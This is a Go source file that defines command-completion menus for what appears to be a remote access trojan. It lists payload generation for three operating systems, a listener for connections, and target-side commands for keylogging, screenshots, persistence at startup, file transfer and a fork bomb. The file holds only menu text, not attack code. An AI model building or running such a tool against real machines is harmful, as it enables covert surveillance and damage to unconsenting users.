package completer

import "github.com/c-bata/go-prompt"

func HostCompleter(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "generate", Description: "Generate a payload"},
		{Text: "address=", Description: "Specify a host address"},
		{Text: "port=", Description: "Specify a port for app"},
		{Text: "filename=", Description: "Specify a filename to output"},
		{Text: "--windows", Description: "Target Windows"},
		{Text: "--macos", Description: "Target Mac OS"},
		{Text: "--linux", Description: "Target Linux"},
		{Text: "listen", Description: "Start a server to listen for connections"},
		{Text: "serve", Description: "Serve files"},
		{Text: "exit", Description: "Quit this program"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}

func ServerCompleter(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "devices", Description: "Show connected devices"},
		{Text: "connect", Description: "Connect to specified device"},
		{Text: "exit", Description: "Quit this program"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}

func ClientCompleter(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "download", Description: "ReceiveFile Download"},
		{Text: "upload", Description: "ReceiveFile Upload"},
		{Text: "screenshot", Description: "Take a Screenshot"},
		{Text: "keylogger_start", Description: "Start Keylogger session"},
		{Text: "keylogger_show", Description: "Show Keylogger session logs"},
		{Text: "persistence_enable", Description: "Install at Startup"},
		{Text: "persistence_disable", Description: "Remove from Startup"},
		{Text: "information", Description: "Get device information"},
		{Text: "lockscreen", Description: "Lock the OS screen"},
		{Text: "openurl", Description: "Open the URL informed"},
		{Text: "bomb", Description: "Run Fork Bomb"},
		{Text: "clear", Description: "Clear the Screen"},
		{Text: "back", Description: "Close app but keep running on target"},
		{Text: "exit", Description: "Close app and exit on target"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}
